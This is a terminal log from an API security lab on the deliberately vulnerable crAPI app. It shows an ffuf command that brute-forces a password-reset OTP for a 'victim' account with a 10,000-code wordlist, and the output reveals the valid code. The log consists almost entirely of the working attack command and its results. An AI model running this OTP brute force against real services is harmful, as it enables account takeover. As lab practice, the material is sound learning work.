┌──(kali㉿kali)-[~/Documents/Labs/APISec/crAPI]
└─$ ffuf -u http://pentest.lab:8888/identity/api/auth/v2/check-otp -w /home/kali/Documents/Labs/APISec/crAPI/crAPINotes/wordlists/otp.txt -X POST -d '{"email":"victimaccount@mail.com","otp":"FUZZ","password":"Password123!"}' -H "Content-Type: application/json" -fc 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://pentest.lab:8888/identity/api/auth/v2/check-otp
 :: Wordlist         : FUZZ: /home/kali/Documents/Labs/APISec/crAPI/crAPINotes/wordlists/otp.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"email":"victimaccount@mail.com","otp":"FUZZ","password":"Password123!"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

5658                    [Status: 200, Size: 39, Words: 2, Lines: 1, Duration: 3698ms]
:: Progress: [10000/10000] :: Job [1/1] :: 40 req/sec :: Duration: [0:04:47] :: Errors: 2 ::
